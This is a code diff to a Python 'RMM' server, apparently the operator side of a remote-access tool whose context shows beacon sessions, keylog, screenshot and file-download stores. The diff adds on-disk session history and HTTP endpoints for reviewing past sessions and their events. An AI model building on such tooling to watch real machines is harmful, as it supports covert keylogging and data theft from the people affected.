@@ -49,6 +49,7 @@ PORT = 8080
 LOG_DIR = "RMM_logs"
 WEB_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web")
 SESSION_FILE = os.path.join(LOG_DIR, "sessions.json")
+HISTORY_DIR = os.path.join(LOG_DIR, "history")
 WEB_MIME = {
     ".html": "text/html; charset=utf-8",
     ".css": "text/css; charset=utf-8",
@@ -138,11 +139,24 @@ def safe_join_under(base_dir: str, *parts: str) -> str:
         raise ValueError("path escapes storage directory")
     return path
 
+
+def _history_session_dir(session_id: str) -> str:
+    sid = validate_beacon_session_id(session_id)
+    if not sid:
+        raise ValueError("invalid session id")
+    return safe_join_under(HISTORY_DIR, sid)
+
+
+def _event_for_history(ev: dict) -> dict:
+    """Drop server-local filesystem paths before writing transcripts to disk."""
+    return {k: v for k, v in ev.items() if k != "artifact"}
+
 # Create directories
 os.makedirs(LOG_DIR, exist_ok=True)
 os.makedirs(os.path.join(LOG_DIR, "downloads"), exist_ok=True)
 os.makedirs(os.path.join(LOG_DIR, "screenshots"), exist_ok=True)
 os.makedirs(os.path.join(LOG_DIR, "keylogs"), exist_ok=True)
+os.makedirs(HISTORY_DIR, exist_ok=True)
 
 # ANSI Colors
 class Colors:
@@ -594,6 +608,169 @@ class RMMServer:
         self.note_download_queued(session, remote_path)
         return cmd
 
+    def _history_meta_path(self, session_id: str) -> str:
+        return os.path.join(_history_session_dir(session_id), "meta.json")
+
+    def _history_events_path(self, session_id: str) -> str:
+        return os.path.join(_history_session_dir(session_id), "events.jsonl")
+
+    def _history_write_meta(
+        self,
+        session,
+        *,
+        ended: bool = False,
+        end_reason: str | None = None,
+    ) -> None:
+        try:
+            session_dir = _history_session_dir(session.id)
+        except ValueError:
+            return
+        os.makedirs(session_dir, exist_ok=True)
+        meta = session.to_dict()
+        meta["session_id"] = session.id
+        meta["updated_at"] = datetime.now().isoformat()
+        meta["active"] = session.id in self.sessions and not ended
+        if ended:
+            meta["ended_at"] = datetime.now().isoformat()
+            meta["end_reason"] = end_reason or "ended"
+        else:
+            meta.setdefault("ended_at", None)
+            meta.setdefault("end_reason", None)
+        try:
+            events_path = self._history_events_path(session.id)
+            if os.path.isfile(events_path):
+                with open(events_path, "r", encoding="utf-8") as f:
+                    meta["event_count"] = sum(1 for line in f if line.strip())
+            else:
+                meta["event_count"] = len(session.result_events)
+        except OSError:
+            meta["event_count"] = len(session.result_events)
+        try:
+            with open(self._history_meta_path(session.id), "w", encoding="utf-8") as f:
+                json.dump(meta, f, indent=2)
+        except OSError as e:
+            self.log(f"History meta write failed for {session.id[:8]}: {e}", "WARNING")
+
+    def _history_append_event(self, session, ev: dict) -> None:
+        try:
+            session_dir = _history_session_dir(session.id)
+        except ValueError:
+            return
+        os.makedirs(session_dir, exist_ok=True)
+        line = json.dumps(_event_for_history(ev), ensure_ascii=False)
+        try:
+            with open(self._history_events_path(session.id), "a", encoding="utf-8") as f:
+                f.write(line + "\n")
+        except OSError as e:
+            self.log(f"History event append failed for {session.id[:8]}: {e}", "WARNING")
+
+    def _finalize_session_history(self, session, reason: str = "killed") -> None:
+        self._history_write_meta(session, ended=True, end_reason=reason)
+
+    def resolve_history_session_id(self, session_id_or_prefix: str) -> str | None:
+        session = self.resolve_session(session_id_or_prefix)
+        if session:
+            return session.id
+        if len(session_id_or_prefix) >= 4:
+            matches = []
+            if os.path.isdir(HISTORY_DIR):
+                for name in os.listdir(HISTORY_DIR):
+                    if name.startswith(session_id_or_prefix):
+                        sid = validate_beacon_session_id(name)
+                        if sid:
+                            matches.append(sid)
+            if len(matches) == 1:
+                return matches[0]
+        return validate_beacon_session_id(session_id_or_prefix)
+
+    def list_session_history(self) -> list[dict]:
+        rows = []
+        active_ids = set(self.sessions.keys())
+        if not os.path.isdir(HISTORY_DIR):
+            return rows
+        try:
+            names = os.listdir(HISTORY_DIR)
+        except OSError:
+            return rows
+        for name in names:
+            sid = validate_beacon_session_id(name)
+            if not sid:
+                continue
+            meta_path = os.path.join(HISTORY_DIR, name, "meta.json")
+            if not os.path.isfile(meta_path):
+                continue
+            try:
+                with open(meta_path, "r", encoding="utf-8") as f:
+                    meta = json.load(f)
+            except (OSError, json.JSONDecodeError):
+                continue
+            if not isinstance(meta, dict):
+                continue
+            meta["session_id"] = sid
+            meta["active"] = sid in active_ids and not meta.get("ended_at")
+            rows.append(meta)
+        rows.sort(
+            key=lambda r: r.get("ended_at") or r.get("updated_at") or r.get("last_seen") or "",
+            reverse=True,
+        )
+        return rows
+
+    def get_history_events(self, session_id_or_prefix, since_id: int = 0, limit: int = 500):
+        session_id = self.resolve_history_session_id(session_id_or_prefix)
+        if not session_id:
+            return None, None
+        events_path = self._history_events_path(session_id)
+        if not os.path.isfile(events_path):
+            live = self.get_session(session_id)
+            if live:
+                with self.session_lock:
+                    events = [e for e in live.result_events if e["id"] > since_id]
+                if limit > 0:
+                    events = events[-limit:]
+                return session_id, events
+            return session_id, []
+        events = []
+        try:
+            with open(events_path, "r", encoding="utf-8") as f:
+                for line in f:
+                    line = line.strip()
+                    if not line:
+                        continue
+                    try:
+                        ev = json.loads(line)
+                    except json.JSONDecodeError:
+                        continue
+                    if isinstance(ev, dict) and ev.get("id", 0) > since_id:
+                        events.append(ev)
+        except OSError:
+            return session_id, None
+        if limit > 0:
+            events = events[-limit:]
+        return session_id, events
+
+    def get_history_meta(self, session_id_or_prefix):
+        session_id = self.resolve_history_session_id(session_id_or_prefix)
+        if not session_id:
+            return None
+        meta_path = self._history_meta_path(session_id)
+        if not os.path.isfile(meta_path):
+            live = self.get_session(session_id)
+            if live:
+                meta = live.to_dict()
+                meta["session_id"] = session_id
+                meta["active"] = True
+                return meta
+            return None
+        try:
+            with open(meta_path, "r", encoding="utf-8") as f:
+                meta = json.load(f)
+        except (OSError, json.JSONDecodeError):
+            return None
+        if isinstance(meta, dict):
+            meta["session_id"] = session_id
+            meta["active"] = session_id in self.sessions and not meta.get("ended_at")
+        return meta
+
     @staticmethod
     def _artifact_public_url(filepath):
         if not filepath:
@@ -625,6 +802,8 @@ class RMMServer:
                 "artifact_url": artifact_url,
             }
             session.result_events.append(ev)
+        self._history_append_event(session, ev)
+        self._history_write_meta(session)
         self.event_hub.broadcast_event(session.id, ev)
         with session.wait_lock:
             if session.wait_event is not None:
@@ -639,6 +818,7 @@ class RMMServer:
         session = self.resolve_session(session_id_or_prefix)
         if not session:
             return False, "not_found"
+        self._finalize_session_history(session, reason="killed")
         with self.session_lock:
             self.killed_sessions.add(session.id)
             if session.id in self.sessions:
@@ -1287,6 +1467,30 @@ class RMMHandler(BaseHTTPRequestHandler):
                 200,
                 {"session_id": session.id, "downloads": downloads or []},
             )
+            return True
+
+        if parts == ["history"]:
+            rows = srv.list_session_history()
+            ended = [r for r in rows if not r.get("active")]
+            self._json(200, {"sessions": ended, "count": len(ended)})
+            return True
+
+        if len(parts) == 2 and parts[0] == "history":
+            meta = srv.get_history_meta(parts[1])
+            if not meta:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            self._json(200, {"session": meta})
+            return True
+
+        if len(parts) == 3 and parts[0] == "history" and parts[2] == "events":
+            since_id = int(qs.get("since", ["0"])[0] or 0)
+            limit = int(qs.get("limit", ["500"])[0] or 500)
+            session_id, events = srv.get_history_events(parts[1], since_id=since_id, limit=limit)
+            if session_id is None or events is None:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            self._json(200, {"session_id": session_id, "events": events})
             return True
 
         if len(parts) == 3 and parts[0] == "artifacts":
